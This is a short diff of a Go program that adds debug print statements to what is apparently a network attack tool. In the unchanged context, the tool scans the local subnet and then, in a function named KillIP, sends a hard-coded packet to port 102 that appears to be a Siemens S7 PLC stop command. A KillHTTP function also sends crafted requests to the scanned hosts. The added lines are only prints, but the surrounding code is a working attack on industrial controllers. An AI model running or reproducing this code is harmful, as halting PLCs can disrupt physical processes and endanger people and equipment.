@@ -21,6 +21,7 @@ func GetIPAddr() string {
 
 	for _, address := range addrs {
 		if ipnet, ok := address.(*net.IPNet); ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
+			fmt.Println(ipnet.IP.String());
 			return ipnet.IP.String()
 		}
 	}
@@ -45,6 +46,7 @@ func GetNetwork(ipAddr string) []string {
 		binary.BigEndian.PutUint32(ip, i)
 		ipList = append(ipList, ip.String())
 	}
+	fmt.Println(ipList);
 	return ipList
 }
 
@@ -58,6 +60,7 @@ func ScanIP(ipList []string) []string {
 			conn.Close()
 		}
 	}
+	fmt.Println(scannedIPs);
 	return scannedIPs
 }
 
@@ -66,6 +69,7 @@ func KillIP(scannedIPs []string) {
 	stop := "\x03\x00\x00\x21\x02\xf0\x80\x32\x01\x00\x00\x06\x00\x00\x10\x00\x00\x29\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d"
 	for _, ip := range scannedIPs {
 		if conn, err := net.Dial("tcp", ip+":102"); err == nil {
+			fmt.Println(ip);
 			conn.Write([]byte(stop))
 			conn.Close()
 		}
@@ -81,6 +85,7 @@ func KillHTTP(scannedIPs []string) {
 		if err != nil {
 			continue
 		}
+		fmt.Println(ip);
 		setHTTPHeaders(req, ip)
 		if _, err = client.Do(req); err != nil {
 			continue
